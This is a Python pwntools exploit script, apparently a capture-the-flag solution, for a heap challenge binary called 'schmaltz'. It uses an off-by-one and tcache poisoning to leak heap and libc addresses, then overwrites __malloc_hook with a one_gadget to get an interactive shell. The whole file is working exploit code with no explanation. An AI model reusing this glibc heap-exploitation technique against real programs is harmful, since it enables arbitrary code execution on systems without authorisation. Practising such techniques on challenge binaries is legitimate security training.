#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.log_level = "critical"
context.binary = "./schmaltz"
elf = context.binary
libc = ELF("./lib/libc.so.6", checksec = False)
libc.sym["one_gadget"] = 0xe0021

def add(size, cont):
    io.sendlineafter("> ", "1")
    io.sendlineafter("> ", str(size))
    io.sendafter("> ", cont)
    sleep(0.01)

def show(idx):
    io.sendlineafter("> ", "3")
    io.sendlineafter("> ", str(idx))

def delete(idx):
    io.sendlineafter("> ", "4")
    io.sendlineafter("> ", str(idx))

def DEBUG():
    info("malloc @ {:#x}".format(0x400A94))
    info("fill @ {:#x}".format(0x400B66))
    info("free @ {:#x}".format(0x400961))
    info("offbyone @ {:#x}".format(0x40088A))
    info("show @ {:#x}".format(0x400A10))
    pause()

io = process(["./lib/ld-2.28.so", "--library-path", "./lib", "./schmaltz"])

add(0x68, '0' * 0x68)
add(0x100, '1' * 0x100)

delete(1)

delete(0)
add(0x68, '0' * 0x68)

delete(1)

add(0xf0, flat(elf.sym["note_table"] + 0x20))
add(0x100, '\n')
add(0x100, flat(elf.sym["note_table"], p32(0x100), p32(1), elf.sym["stderr"], p32(0x100), p32(1)))

show(2)
io.recvuntil("Content: ")
heap = u64(io.recvuntil('\n', drop = True).ljust(8, '\0')) - 0x2d0
print("heap @ {:#x}".format(heap))
assert heap & 0xfff == 0

show(3)
io.recvuntil("Content: ")
libc.address = u64(io.recvuntil('\n', drop = True).ljust(8, '\0')) - libc.sym['_IO_2_1_stderr_']
print("libc @ {:#x}".format(libc.address))
assert libc.address & 0xfff == 0

add(0x68, '0' * 0x68)
add(0x110, '1' * 0x110)

delete(4)

delete(3)
add(0x68, '0' * 0x68)

delete(4)

#  DEBUG()
add(0xf0, flat(libc.sym["__malloc_hook"]))
add(0x110, '\n')
add(0x110, flat(libc.sym['one_gadget']))

io.sendlineafter("> ", "1")
io.sendlineafter("> ", "1")

io.interactive()
